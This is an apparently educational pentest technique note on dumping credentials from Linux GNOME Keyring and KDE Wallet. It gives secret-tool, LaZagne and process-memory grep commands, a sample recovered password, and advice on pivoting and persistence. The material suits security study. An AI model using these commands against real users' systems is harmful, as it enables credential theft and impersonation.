### Technique Name:

Credential Extraction from Linux Keyrings
### Summary:

Linux keyrings are used to store sensitive credentials securely, including Wi-Fi passwords, GPG keys, SSH keys, and browser login data. On systems with graphical environments like GNOME or KDE, the keyring is often unlocked at login and stored in memory, which can be dumped or queried by tools.
### Conditions:

- User must have access to the desktop session or be able to run commands as the user.    
- Root privileges are required to dump other usersâ€™ keyrings.
- GNOME Keyring or KDE Wallet must be running.
### Enumeration:
#### 1. Check if GNOME Keyring is Running

```bash
ps aux | grep gnome-keyring
```
#### 2. List Keyring Files

```bash
ls ~/.local/share/keyrings/
```

Expected files:

```
login.keyring
user.keystore
```
#### 3. List Keyring Services

```bash
secret-tool search --all
```
### Exploitation:
#### 1. Dump with Secret Tool

`secret-tool` allows querying GNOME Keyring credentials from within the user session.

Example:

```bash
secret-tool search application gnome-keyring
```

Or, general use:

```bash
secret-tool search --all
```
#### 2. Using LaZagne for Keyrings

LaZagne automates keyring extraction where supported.

Example:

```bash
python2 laZagne.py keyring
```

Sample Output:

```text
[+] GNOME Keyring found!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY
```
#### 3. Manual Extraction (if decrypted in memory)

```bash
strings /proc/$(pidof gnome-keyring-daemon)/mem 2>/dev/null | grep -iE 'pass|token|user'
```
### Post-Exploitation:

- Extracted passwords may allow pivoting into services (SSH, email, APIs).    
- Recovered GPG or SSH keys can be reused for signing, authentication, or impersonation.
- Maintain persistence by creating your own entries into the keyring if access is long-term.
